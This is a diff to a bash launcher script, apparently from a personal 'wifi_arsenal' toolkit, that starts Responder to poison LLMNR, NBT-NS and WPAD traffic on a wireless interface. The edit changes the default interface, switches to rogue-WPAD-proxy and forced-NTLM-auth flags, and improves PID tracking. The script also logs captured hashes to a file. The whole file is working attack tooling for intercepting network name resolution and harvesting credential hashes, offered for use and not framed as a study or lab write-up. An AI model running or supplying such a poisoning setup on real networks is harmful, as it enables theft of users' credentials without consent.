@@ -1,7 +1,7 @@
 #!/bin/bash
 # Start Responder for LLMNR/NBT-NS/WPAD poisoning
 
-INTERFACE="${1:-alfa0}"
+INTERFACE="${1:-alfa1}"
 PID_FILE="/tmp/responder_pid.txt"
 LOG_DIR="/home/ov3rr1d3/wifi_arsenal/captures/responder"
 HASH_FILE="/home/ov3rr1d3/wifi_arsenal/captures/hashes/responder_hashes.txt"
@@ -30,17 +30,18 @@ fi
 # Start Responder
 # -I interface
 # -w enable WPAD rogue proxy
-# -r enable answers for netbios wredir suffix
-# -d enable answers for netbios domain suffix
-# -P force NTLM auth for WPAD
-sudo responder -I "$INTERFACE" -w -r -d -P > "$LOG_DIR/responder.log" 2>&1 &
-RESP_PID=$!
-echo $RESP_PID > "$PID_FILE"
+# -F force NTLM auth on WPAD file retrieval
+sudo responder -I "$INTERFACE" -w -F > "$LOG_DIR/responder.log" 2>&1 &
+SUDO_PID=$!
 
 sleep 3
 
-if ps -p $RESP_PID > /dev/null 2>&1; then
-    echo "[+] Responder started (PID: $RESP_PID)"
+# Find the actual responder child of sudo (sudo PID != tool PID)
+REAL_PID=$(pgrep -P $SUDO_PID -f "responder" 2>/dev/null || echo $SUDO_PID)
+echo $REAL_PID > "$PID_FILE"
+
+if ps -p $REAL_PID > /dev/null 2>&1; then
+    echo "[+] Responder started (PID: $REAL_PID)"
     echo "[+] Poisoning LLMNR, NBT-NS, WPAD"
     echo "[+] Logs: $LOG_DIR/responder.log"
     
